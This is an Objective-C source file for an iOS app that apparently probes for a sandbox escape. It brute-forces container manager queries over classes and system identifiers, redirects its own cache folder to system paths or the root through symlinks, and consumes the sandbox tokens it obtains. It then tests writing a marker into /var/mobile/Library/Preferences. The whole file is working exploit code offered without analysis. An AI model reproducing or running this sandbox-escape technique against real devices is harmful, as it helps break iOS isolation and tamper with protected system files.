// sbclasssweep — brute-force MCM classes/identifiers/parts with fork isolation.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <signal.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids, q_group_ids;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;

static FILE *gLog;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbsweep] %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail"); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_identifiers");
    q_group_ids = (fn_set_obj)dlsym(h, "container_query_set_group_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    return q_create && q_get && q_token && s_consume;
}

static NSString *findGroup(void) {
    NSArray *ids = @[@"group.8e0bc870a21520b9.1", @"group.8e0bc870a21520b9.2",
                     @"group.8e0bc870a21520b9.3", @"group.8e0bc870a21520b9.4",
                     @"group.8e0bc870a21520b9.5"];
    for (NSString *gid in ids) {
        NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid];
        if (u.path.length) return gid;
    }
    return nil;
}

struct result {
    int res;
    int has_token;
    char token[1024];
};

static void child_query(uint64_t cls, const char *ident, int group, int fd) {
    alarm(4);
    struct result r; memset(&r, 0, sizeof(r));
    void *q = q_create();
    if (!q) { write(fd, &r, sizeof(r)); _exit(0); }
    q_class(q, cls);
    void *x = xpc_string ? xpc_string(ident) : NULL;
    if (group) { if (q_group_ids) q_group_ids(q, x); }
    else { if (q_ids) q_ids(q, x); }
    q_part(q, 3);
    q_flags(q, 0x8000000000ULL);
    void *res = q_get(q);
    r.res = res ? 1 : 0;
    char *tok = (res && q_token) ? q_token(res) : NULL;
    r.has_token = tok ? 1 : 0;
    if (tok) { strncpy(r.token, tok, sizeof(r.token) - 1); free(tok); }
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    write(fd, &r, sizeof(r));
    _exit(0);
}

static void runOne(NSString *tag, uint64_t cls, const char *ident, int group) {
    int fds[2]; if (pipe(fds) != 0) return;
    pid_t pid = fork();
    if (pid == 0) { close(fds[0]); child_query(cls, ident, group, fds[1]); _exit(0); }
    close(fds[1]);
    struct result r; memset(&r, 0, sizeof(r));
    ssize_t n = read(fds[0], &r, sizeof(r));
    close(fds[0]);
    int st = 0; waitpid(pid, &st, 0);
    const char *path = "";
    if (r.has_token) { char *semi = strrchr(r.token, ';'); if (semi) path = semi + 1; }
    L(@"[%@] cls=%llu group=%d res=%d tok=%d path=%s crash=%d", tag, (unsigned long long)cls,
      group, r.res, r.has_token, path, WIFSIGNALED(st) ? WTERMSIG(st) : 0);
    if (r.has_token) {
        int64_t h = s_consume(r.token);
        L(@"[%@] consume=%lld", tag, (long long)h);
        if (h >= 0) {
            NSString *p = @"/var/mobile/Library/Preferences";
            DIR *d = opendir(p.fileSystemRepresentation);
            L(@"[%@] opendir prefs=%p errno=%d", tag, d, errno);
            if (d) closedir(d);
            NSString *m = [p stringByAppendingPathComponent:@"sbclasssweep_marker"];
            int fd = open(m.fileSystemRepresentation, O_CREAT|O_WRONLY|O_TRUNC, 0644);
            L(@"[%@] write prefs=%d errno=%d", tag, fd, errno);
            if (fd >= 0) { write(fd,"x",1); close(fd); unlink(m.fileSystemRepresentation); }
            s_release(h);
        }
    }
}

static void runProbe(void) {
    @autoreleasepool {
        NSString *home = NSHomeDirectory();
        NSString *logPath = [home stringByAppendingPathComponent:@"Documents/sbclasssweep.log"];
        gLog = fopen(logPath.fileSystemRepresentation, "w");
        L(@"=== sbclasssweep start pid=%d", getpid());
        if (!load()) return;
        NSString *gid = findGroup();
        if (!gid) { L(@"no group"); return; }
        NSString *root = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gid].path;
        NSString *part = [root stringByAppendingPathComponent:@"Library/Caches"];
        NSString *valid = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
        NSArray<NSDictionary *> *idents = @[
            @{@"v": bid ?: @"", @"g": @0},
            @{@"v": gid, @"g": @1},
            @{@"v": @"com.apple.geod", @"g": @0},
            @{@"v": @"systemgroup.com.apple.mobilegestaltcache", @"g": @0},
            @{@"v": @"systemgroup.com.apple.mobilegestaltcache", @"g": @1},
            @{@"v": @"com.apple.Preferences", @"g": @0},
        ];
        NSArray<NSString *> *targets = @[valid, @"/"];
        NSString *bak = [part stringByAppendingString:@".sweepbak"];
        NSFileManager *fm = [NSFileManager defaultManager];
        for (NSString *target in targets) {
            [fm removeItemAtPath:bak error:nil];
            if ([fm fileExistsAtPath:part]) [fm moveItemAtPath:part toPath:bak error:nil];
            unlink(part.fileSystemRepresentation);
            if (symlink(target.fileSystemRepresentation, part.fileSystemRepresentation) != 0) {
                L(@"symlink %@ failed errno=%d", target, errno);
                if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:part error:nil];
                continue;
            }
            L(@"===== target %@ =====", target);
            for (uint64_t cls = 0; cls <= 24; cls++) {
                for (NSDictionary *d in idents) {
                    const char *ident = [d[@"v"] UTF8String];
                    int group = [d[@"g"] intValue];
                    NSString *tag = [NSString stringWithFormat:@"t%@-c%llu-%d", [target isEqualToString:valid] ? @"V" : @"S", (unsigned long long)cls, group];
                    runOne(tag, cls, ident, group);
                }
            }
            unlink(part.fileSystemRepresentation);
            if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:part error:nil];
        }
        L(@"=== sbclasssweep done ===");
        if (gLog) { fclose(gLog); gLog = NULL; }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbclasssweep"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
